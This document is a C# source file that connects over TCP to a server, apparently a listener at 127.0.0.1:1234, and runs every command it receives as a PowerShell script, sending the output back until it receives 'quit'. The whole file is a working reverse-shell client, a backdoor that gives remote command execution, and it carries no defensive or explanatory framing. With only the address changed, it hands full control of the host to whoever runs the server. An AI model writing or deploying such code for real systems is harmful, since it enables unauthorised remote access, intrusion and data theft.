﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;



namespace ClientSocket
{
    class Program
    {

        public string GetResult(string cmd)
        {
            string result="";
            RunspaceConfiguration rc = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(rc);
            r.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript(cmd);

            StringWriter sw = new StringWriter();

            Collection<PSObject> po = ps.Invoke();
            foreach (PSObject p in po)
            {
                sw.WriteLine(p.ToString());
            }
            result = sw.ToString();
            if (result == "")
            {
                return "ERROR OCCURRED";
            }

            return result;

        }

        static void Main(string[] args)
        {

            Program p = new Program();

            int BUFFER_SIZE = 2048;

            IPAddress server_ip = IPAddress.Parse("127.0.0.1");
            IPEndPoint ipe = new IPEndPoint(server_ip, 1234);
            Socket cs = new Socket(server_ip.AddressFamily,SocketType.Stream,ProtocolType.Tcp);
            cs.Connect(ipe);

            string msg;
            byte[] b = new byte[BUFFER_SIZE];
            
            Array.Clear(b, 0, b.Length);
            cs.Receive(b);

            msg = Encoding.ASCII.GetString(b).TrimEnd('\0');

            string result;
            while (msg != "quit")
            {
                Console.WriteLine("[+] Received from Server: {0}", msg);
                result = p.GetResult(msg);

                cs.Send(Encoding.ASCII.GetBytes(result));
                Array.Clear(b, 0, b.Length);
                cs.Receive(b);
                msg = Encoding.ASCII.GetString(b).TrimEnd('\0');
            }
            cs.Close();
            //Console.ReadKey();
        }
    }
}
